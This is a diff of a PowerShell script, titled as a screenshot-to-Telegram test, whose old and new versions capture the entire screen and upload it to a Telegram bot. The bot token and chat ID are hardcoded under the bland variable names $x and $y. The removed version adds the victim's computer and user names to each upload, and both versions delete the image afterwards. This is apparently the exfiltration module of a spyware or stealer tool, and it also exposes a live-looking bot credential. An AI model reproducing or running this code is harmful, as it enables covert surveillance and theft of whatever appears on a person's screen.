@@ -1,141 +1,49 @@
-# SIMPLE SCREENSHOT TO TELEGRAM - FIXED VERSION
+# Test Screenshot Function
+$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+$y = "2146236602"
 
-# Configuration
-$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"  # Bot token
-$y = "2146236602"  # Chat ID
+# Take screenshot
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap=New-Object Drawing.Bitmap $screen.Width,$screen.Height
+$graphics=[Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size)
+$path="$env:TEMP\test_ss.png"
+$bitmap.Save($path)
+$graphics.Dispose();$bitmap.Dispose()
 
-# Function to capture and send screenshot
-function Capture-Screenshot {
-    Write-Host "📸 Taking screenshot..." -ForegroundColor Yellow
-    
-    try {
-        # Load required assemblies
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        
-        # Capture screen
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
-        
-        # Save to temp file
-        $screenshotPath = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
-        $bitmap.Dispose()
-        
-        Write-Host "✅ Screenshot saved: $screenshotPath" -ForegroundColor Green
-        
-        # Send to Telegram - SIMPLER METHOD
-        Write-Host "📤 Sending to Telegram..." -ForegroundColor Yellow
-        
-        # Create caption
-        $caption = "🖥️ Screenshot from $env:COMPUTERNAME`n👤 User: $env:USERNAME`n📍 Time: $(Get-Date -Format 'HH:mm:ss')"
-        
-        # METHOD 1: Using curl (most reliable)
-        try {
-            $curlCmd = "curl -s -X POST `"https://api.telegram.org/bot$x/sendPhoto`" -F `"chat_id=$y`" -F `"caption=$caption`" -F `"photo=@$screenshotPath`""
-            $result = Invoke-Expression $curlCmd
-            
-            if ($result) {
-                $jsonResult = $result | ConvertFrom-Json
-                if ($jsonResult.ok -eq $true) {
-                    Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
-                    Remove-Item $screenshotPath -Force
-                    return
-                }
-            }
-        } catch {
-            Write-Host "⚠️  Curl method failed, trying alternative..." -ForegroundColor Yellow
-        }
-        
-        # METHOD 2: Using Invoke-WebRequest with -Form parameter
-        try {
-            $uri = "https://api.telegram.org/bot$x/sendPhoto"
-            $form = @{
-                chat_id = $y
-                caption = $caption
-                photo = Get-Item $screenshotPath
-            }
-            
-            $response = Invoke-WebRequest -Uri $uri -Method Post -Form $form
-            $result = $response.Content | ConvertFrom-Json
-            
-            if ($result.ok) {
-                Write-Host "✅ Screenshot sent via Invoke-WebRequest!" -ForegroundColor Green
-                Remove-Item $screenshotPath -Force
-                return
-            }
-        } catch {
-            Write-Host "⚠️  Method 2 failed, trying direct multipart..." -ForegroundColor Yellow
-        }
-        
-        # METHOD 3: Direct multipart/form-data
-        try {
-            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-            $boundary = "----WebKitFormBoundary" + (Get-Date).Ticks.ToString("x")
-            
-            $body = @"
---$boundary
-Content-Disposition: form-data; name="chat_id"
+# Send using the EXACT method from your main script
+$caption="Test screenshot"
+$fileBytes=[System.IO.File]::ReadAllBytes($path)
+$fileEnc=[System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+$boundary=[System.Guid]::NewGuid().ToString()
+$bodyLines = (
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"chat_id`"",
+    "",
+    $y,
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"caption`"",
+    "",
+    $caption,
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"photo`"; filename=`"test.png`"",
+    "Content-Type: image/png",
+    "",
+    $fileEnc,
+    "--$boundary--"
+) -join "`r`n"
 
-$y
---$boundary
-Content-Disposition: form-data; name="caption"
+$uri="https://api.telegram.org/bot$x/sendPhoto"
 
-$caption
---$boundary
-Content-Disposition: form-data; name="photo"; filename="screenshot.png"
-Content-Type: image/png
-
-$fileEnc
---$boundary--
-"@
-            
-            $uri = "https://api.telegram.org/bot$x/sendPhoto"
-            $response = Invoke-RestMethod -Uri $uri -Method Post `
-                -ContentType "multipart/form-data; boundary=$boundary" `
-                -Body ([System.Text.Encoding]::UTF8.GetBytes($body))
-            
-            if ($response.ok) {
-                Write-Host "✅ Screenshot sent via direct method!" -ForegroundColor Green
-                Remove-Item $screenshotPath -Force
-                return
-            }
-        } catch {
-            Write-Host "❌ All methods failed!" -ForegroundColor Red
-            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-        }
-        
-    } catch {
-        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
+try {
+    $response=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
+    if($response.ok){
+        Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
     }
+} catch {
+    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# Test the connection first
-function Test-BotConnection {
-    Write-Host "🔗 Testing bot connection..." -ForegroundColor Yellow
-    try {
-        $url = "https://api.telegram.org/bot$x/getMe"
-        $response = Invoke-RestMethod -Uri $url
-        if ($response.ok) {
-            Write-Host "✅ Bot is working: @$($response.result.username)" -ForegroundColor Green
-            return $true
-        }
-    } catch {
-        Write-Host "❌ Bot connection failed!" -ForegroundColor Red
-        Write-Host "Check your bot token and chat ID" -ForegroundColor Yellow
-        return $false
-    }
-}
-
-# Execute
-Clear-Host
-Write-Host "Screenshot to Telegram Test" -ForegroundColor Cyan
-Write-Host "===========================" -ForegroundColor Cyan
-
-if (Test-BotConnection) {
-    Capture-Screenshot
-}
+# Cleanup
+Remove-Item $path -ErrorAction SilentlyContinue
